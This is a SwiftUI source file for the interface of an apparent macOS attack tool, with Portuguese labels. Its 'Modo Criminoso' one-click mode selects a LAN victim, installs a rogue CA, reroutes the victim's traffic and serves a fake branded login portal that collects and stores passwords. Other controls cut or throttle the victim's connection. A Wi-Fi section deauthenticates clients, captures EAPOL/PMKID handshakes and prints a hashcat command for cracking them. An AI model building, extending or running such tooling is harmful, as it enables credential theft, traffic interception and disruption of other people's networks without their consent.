import SwiftUI
import AppKit
import UniformTypeIdentifiers
import PastoralCore

/// Lobo tab: one-click invasion. One target, weapon toggles
/// (portal cativo / pulso / gargalo), portal content editing, and a
/// single big button to invade or retreat.
struct LoboTabView: View {
    @Bindable var state: AppState
    @State private var importingImage = false
    @State private var showCriminalAlert = false
    @State private var criminalAlertMessage = ""

    private var targets: [Host] { state.hosts.filter { !$0.isExcluded } }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                criminalSection
                targetSection
                weaponsSection
                portalSection
                harvestSection
                wifiSection
                actionSection
                statusFooter
            }
            .padding()
        }
        .fileImporter(isPresented: $importingImage,
                      allowedContentTypes: [.jpeg, .png]) { result in
            if case let .success(url) = result {
                importLoboImage(url)
            }
        }
        .alert("Modo Criminoso", isPresented: $showCriminalAlert) {
            Button("OK", role: .cancel) {}
        } message: {
            Text(criminalAlertMessage)
        }
    }

    // MARK: Modo Criminoso (one-click)

    private var criminalSection: some View {
        GroupBox {
            VStack(alignment: .leading, spacing: 10) {
                Label("Modo Criminoso", systemImage: "moon.stars.fill")
                    .font(.headline)
                Text("""
                    Um clique faz tudo: escolhe o melhor alvo, instala a confiança \
                    no Mac, força o tráfego do alvo pelo Pastoral e serve uma \
                    página de login que registra usuário e senha. Quem tocar em \
                    “Confiar neste perfil de rede” entrega também a chave dos sites HTTPS.
                    """)
                    .font(.caption)
                    .foregroundStyle(.secondary)
                Button {
                    Task {
                        let err = await state.criminalStrike()
                        if let err {
                            criminalAlertMessage = err
                            showCriminalAlert = true
                        } else {
                            state.selectedTab = .lobo
                        }
                    }
                } label: {
                    Label("ATIVAR CRIMINOSO", systemImage: "bolt.shield.fill")
                        .font(.title3.bold())
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 6)
                }
                .buttonStyle(.borderedProminent)
                .tint(.red)
                .disabled(!state.helper.responding || state.loboActive)
                .help(state.helper.responding
                      ? "Scan → alvo → CA → rota → portal de login, tudo automático."
                      : "Instale o helper primeiro.")
            }
            .padding(4)
        }
    }

    // MARK: Target

    private var targetSection: some View {
        GroupBox("Alvo") {
            HStack(spacing: 10) {
                Menu {
                    if targets.isEmpty {
                        Text("Nenhum host no ar — rode o Scan")
                            .foregroundStyle(.secondary)
                    }
                    ForEach(targets) { host in
                        Button("\(host.hostname)   (\(host.ip))") {
                            state.loboTargetID = host.id
                        }
                    }
                } label: {
                    if let t = state.loboTarget {
                        Label("\(t.hostname)  (\(t.ip))", systemImage: "scope")
                    } else {
                        Text("Escolher alvo…").foregroundStyle(.secondary)
                    }
                }
                .fixedSize()
                Spacer()
                if let t = state.loboTarget, t.isDiverted {
                    Text("rotas ativas")
                        .font(.caption)
                        .foregroundStyle(.orange)
                }
            }
        }
    }

    // MARK: Weapons

    private var weaponsSection: some View {
        GroupBox("Armas") {
            VStack(alignment: .leading, spacing: 8) {
                ForEach(AppState.LoboWeapon.allCases) { weapon in
                    Toggle(isOn: Binding(
                        get: { state.loboWeapons.contains(weapon) },
                        set: { state.setLoboWeapon(weapon, on: $0) }
                    )) {
                        Label(weapon.rawValue, systemImage: icon(for: weapon))
                    }
                }
                if state.loboWeapons.contains(.pulso) {
                    HStack(spacing: 16) {
                        Stepper(value: $state.loboPulseEvery, in: 5...300, step: 5) {
                            Text("corte a cada \(state.loboPulseEvery)s")
                                .monospacedDigit()
                        }
                        Stepper(value: $state.loboPulseCut, in: 1...30) {
                            Text("durando \(state.loboPulseCut)s")
                                .monospacedDigit()
                        }
                    }
                    .font(.callout)
                    .padding(.leading, 26)
                }
                if state.loboWeapons.contains(.gargalo) {
                    Text("~50 Kbit/s: carrega, mas não flui.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                        .padding(.leading, 26)
                }
            }
        }
    }

    private func icon(for weapon: AppState.LoboWeapon) -> String {
        switch weapon {
        case .portal:  "globe.desk"
        case .pulso:   "bolt.horizontal"
        case .gargalo: "gauge.with.dots.needle.67percent"
        }
    }

    // MARK: Portal content

    private var portalSection: some View {
        GroupBox("Portal cativo") {
            VStack(alignment: .leading, spacing: 8) {
                Picker("Rosto do portal", selection: $state.loboPortalStyle) {
                    ForEach(AppState.PortalStyle.allCases) { style in
                        Text(style.rawValue).tag(style)
                    }
                }
                .pickerStyle(.segmented)
                if state.loboPortalStyle == .login {
                    Picker("Marca do login", selection: $state.loboLoginFlavor) {
                        ForEach(CredentialPortal.PageStyle.allCases, id: \.self) { s in
                            Text(s.rawValue).tag(s)
                        }
                    }
                    .pickerStyle(.segmented)
                    if state.caProfileData != nil {
                        Label("A página oferece “Confiar neste perfil de rede” — o botão da armadilha TLS.",
                              systemImage: "hand.thumbsup.circle")
                            .font(.caption)
                            .foregroundStyle(.green)
                    } else {
                        Text("Sem CA ainda — a armadilha “Confiar neste perfil” só aparece depois que a CA existir (o Modo Criminoso cuida disso).")
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                } else {
                    TextField("Mensagem que o alvo vai ver", text: $state.loboMessage)
                        .textFieldStyle(.roundedBorder)
                        .onChange(of: state.loboMessage) {
                            state.loboPortalContentChanged()
                        }
                    HStack {
                        Button(state.loboImageName ?? "Escolher imagem de fundo…") {
                            importingImage = true
                        }
                        .controlSize(.small)
                        if state.loboImageData != nil {
                            Button("remover imagem", role: .destructive) {
                                state.loboImageData = nil
                                state.loboImageName = nil
                                state.loboPortalContentChanged()
                            }
                            .controlSize(.small)
                        }
                        Spacer()
                    }
                }
                Text("Os navegadores do alvo abrem esta página quando o sistema decide que a rede caiu.")
                    .font(.caption)
                    .foregroundStyle(.secondary)
            }
        }
    }

    // MARK: Colheita

    private var harvestSection: some View {
        GroupBox("Colheita · \(state.harvested.count)") {
            VStack(alignment: .leading, spacing: 8) {
                if state.harvested.isEmpty {
                    Text("Nada colhido ainda. Com o portal em “Login”, cada usuário e senha digitados caem aqui — e ficam salvos mesmo se o app fechar.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } else {
                    ForEach(state.harvested.prefix(20)) { cred in
                        HStack(spacing: 8) {
                            Image(systemName: "key.fill")
                                .foregroundStyle(.orange)
                                .frame(width: 18)
                            Text("\(cred.user) — \(cred.pass)")
                                .font(.callout.monospaced())
                                .lineLimit(1)
                            Spacer()
                            VStack(alignment: .trailing, spacing: 1) {
                                Text("\(cred.page) · \(cred.ssid.isEmpty ? "Wi-Fi" : cred.ssid)")
                                    .font(.caption2)
                                    .foregroundStyle(.secondary)
                                Text(cred.timestamp.formatted(date: .omitted, time: .shortened))
                                    .font(.caption2)
                                    .foregroundStyle(.tertiary)
                            }
                        }
                        .padding(.vertical, 2)
                    }
                    if state.harvested.count > 20 {
                        Text("+\(state.harvested.count - 20) anterior(es)…")
                            .font(.caption2)
                            .foregroundStyle(.tertiary)
                    }
                }
                HStack {
                    Button("Copiar tudo") { copyHarvest() }
                        .controlSize(.small)
                        .disabled(state.harvested.isEmpty)
                    Button("Limpar", role: .destructive) { state.clearHarvest() }
                        .controlSize(.small)
                        .disabled(state.harvested.isEmpty)
                    Spacer()
                }
            }
        }
    }

    private func copyHarvest() {
        let pb = NSPasteboard.general
        pb.clearContents()
        pb.setString(state.harvestSummaryText, forType: .string)
    }

    // MARK: Wi-Fi caça-senha

    private var wifiSection: some View {
        GroupBox("Wi-Fi · caça-senha") {
            VStack(alignment: .leading, spacing: 8) {
                if let cur = state.wifiCurrent {
                    Label("Rede atual: \(cur.ssid.isEmpty ? "(sem nome)" : cur.ssid)  ·  \(cur.bssid)  ·  ch \(cur.channel.map(String.init) ?? "?")",
                          systemImage: "wifi")
                        .font(.callout)
                } else {
                    HStack(spacing: 8) {
                        Text("Nenhuma rede mapeada — escaneie para ver a sua e as vizinhas.")
                            .font(.caption)
                            .foregroundStyle(.secondary)
                        Spacer()
                        Button(state.houndBusy ? "Ouvindo…" : "Escanear redes") {
                            Task { await state.scanWiFi() }
                        }
                        .controlSize(.small)
                        .disabled(!state.helper.responding || state.houndBusy)
                    }
                }
                if !state.wifiNets.isEmpty {
                    // Neighbours, collapsed — tap to expand? Keep it a small list.
                    DisclosureGroup("Vizinhança (\(state.wifiNets.count))") {
                        VStack(alignment: .leading, spacing: 2) {
                            ForEach(state.wifiNets.prefix(10)) { net in
                                Text("\(net.ssid)  ·  \(net.bssid)  ·  ch \(net.channel.map(String.init) ?? "?")  \(net.signal.map { "(\($0) dBm)" } ?? "")  \(net.security)  \(net.current ? "← você" : "")")
                                    .font(.caption.monospaced())
                                    .foregroundStyle(net.current ? .primary : .secondary)
                            }
                        }
                        .padding(.top, 4)
                    }
                    .font(.caption)
                }
                if let cur = state.wifiCurrent, !cur.bssid.isEmpty {
                    HStack(spacing: 8) {
                        Button(state.houndBusy ? "Ouvindo (\(state.hcxLines.count))…" : "Caçar senha (60s)") {
                            Task { await state.passwordHunt(seconds: 60) }
                        }
                        .buttonStyle(.borderedProminent)
                        .tint(.orange)
                        .disabled(!state.helper.responding || state.houndBusy)
                        .help("Corta os clientes da rede por um instante; quando voltarem, registra as chaves que eles apertam com o roteador.")
                        if state.houndBusy {
                            Button("Parar") { state.stopHound() }
                                .controlSize(.small)
                        }
                        Spacer()
                    }
                    Text("""
                    Deauth + escuta EAPOL/PMKID. As linhas capturadas saem prontas \
                    para o hashcat: hashcat -m 22001 arquivo.txt rockyou.txt
                    """)
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                }
                if !state.hcxLines.isEmpty {
                    VStack(alignment: .leading, spacing: 4) {
                        HStack {
                            Text("\(state.hcxLines.count) linha(s) capturada(s)")
                                .font(.caption)
                                .foregroundStyle(.orange)
                            Spacer()
                            Button("Copiar linhas hashcat") {
                                let pb = NSPasteboard.general
                                pb.clearContents()
                                pb.setString(state.hcxLines.joined(separator: "\n"), forType: .string)
                            }
                            .controlSize(.small)
                        }
                        ScrollView {
                            ForEach(Array(state.hcxLines.prefix(5).enumerated()), id: \.offset) { _, line in
                                Text(line)
                                    .font(.caption2.monospaced())
                                    .lineLimit(2)
                            }
                        }
                        .frame(height: 72)
                        .background(RoundedRectangle(cornerRadius: 6).fill(Color.black.opacity(0.05)))
                    }
                }
            }
        }
    }

    // MARK: Action

    private var actionSection: some View {
        Button {
            Task {
                if state.loboActive {
                    await state.loboRetreat()
                } else {
                    await state.loboInvade()
                }
            }
        } label: {
            Label(state.loboActive ? "RETIRAR" : "INVADIR",
                  systemImage: state.loboActive
                    ? "arrow.uturn.backward.circle.fill"
                    : "pawprint.circle.fill")
                .font(.title2.bold())
                .frame(maxWidth: .infinity)
                .padding(.vertical, 8)
        }
        .buttonStyle(.borderedProminent)
        .tint(state.loboActive ? .orange : .red)
        .disabled(!state.loboReady)
        .help(state.loboReady
              ? (state.loboActive
                 ? "Desfaz tudo e devolve a rede ao alvo."
                 : "Liga roteamento, proxy e as armas escolhidas num clique.")
              : "Escolha um alvo primeiro.")
    }

    // MARK: Footer

    private var statusFooter: some View {
        VStack(alignment: .leading, spacing: 4) {
            Text(statusLine)
                .font(.callout)
                .foregroundStyle(state.loboActive ? .orange : .secondary)
            Text("O INVADIR liga o Sheep (proxy de captura) sozinho se estiver desligado.")
                .font(.caption2)
                .foregroundStyle(.tertiary)
        }
    }

    private var statusLine: String {
        guard let t = state.loboTarget else {
            return "Escolha um alvo para começar."
        }
        guard state.loboActive else {
            return "Mira travada: \(t.hostname) (\(t.ip))."
        }
        var parts = ["Invasão ativa em \(t.hostname)"]
        if state.loboWeapons.contains(.portal) { parts.append("portal cativo") }
        if state.loboWeapons.contains(.pulso) {
            parts.append("pulso a cada \(state.loboPulseEvery)s")
        }
        if state.loboWeapons.contains(.gargalo) { parts.append("gargalo ~50 Kbit/s") }
        return parts.joined(separator: " · ")
    }

    // MARK: Image import

    private func importLoboImage(_ url: URL) {
        _ = url.startAccessingSecurityScopedResource()
        defer { url.stopAccessingSecurityScopedResource() }
        guard let src = NSImage(contentsOf: url),
              let rep = Self.downscale(src, maxDimension: 1280),
              let data = rep.representation(
                  using: .jpeg,
                  properties: [.compressionFactor: 0.8]) else { return }
        state.loboImageData = data
        state.loboImageName = url.lastPathComponent
        state.loboPortalContentChanged()
    }

    /// Scale an image down to `maxDimension` on its longest side and
    /// render it into an RGBA bitmap ready for JPEG encoding.
    static func downscale(_ image: NSImage, maxDimension: CGFloat) -> NSBitmapImageRep? {
        let size = image.size
        guard size.width > 0, size.height > 0 else { return nil }
        let scale = min(1, maxDimension / max(size.width, size.height))
        let newSize = NSSize(width: (size.width * scale).rounded(),
                             height: (size.height * scale).rounded())
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil,
                                   pixelsWide: Int(newSize.width),
                                   pixelsHigh: Int(newSize.height),
                                   bitsPerSample: 8, samplesPerPixel: 4,
                                   hasAlpha: true, isPlanar: false,
                                   colorSpaceName: .deviceRGB,
                                   bytesPerRow: 0, bitsPerPixel: 0)
        guard let rep else { return nil }
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        image.draw(in: NSRect(origin: .zero, size: newSize),
                   from: NSRect(origin: .zero, size: size),
                   operation: .copy, fraction: 1)
        NSGraphicsContext.restoreGraphicsState()
        return rep
    }
}
